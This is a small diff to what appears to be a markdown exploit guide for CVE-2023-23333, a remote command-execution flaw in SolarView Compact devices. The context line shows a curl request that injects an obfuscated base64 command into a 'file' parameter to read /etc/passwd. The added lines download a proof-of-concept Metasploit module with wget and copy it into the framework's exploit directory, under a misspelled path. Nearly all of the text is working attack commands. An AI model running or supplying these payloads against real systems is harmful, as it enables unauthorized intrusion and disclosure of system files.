@@ -24,7 +24,9 @@ curl http://target.com/downloader.php?file=;echo%20Y2F0IC9ldGMvcGFzc3dkCg==|base
 ```
 
 ### Metasploit-Framework
-
+```
+wget https://raw.githubusercontent.com/getdrive/PoC/main/2023/SolarView_Compact/solarview_compact.rb
+```
 ```
 cp solarview_compact.rb /usr/share/matasploit-framework/modules/exploits/linux/http/solarview_unauth_rce_cve_2023_23333.rb
 ```
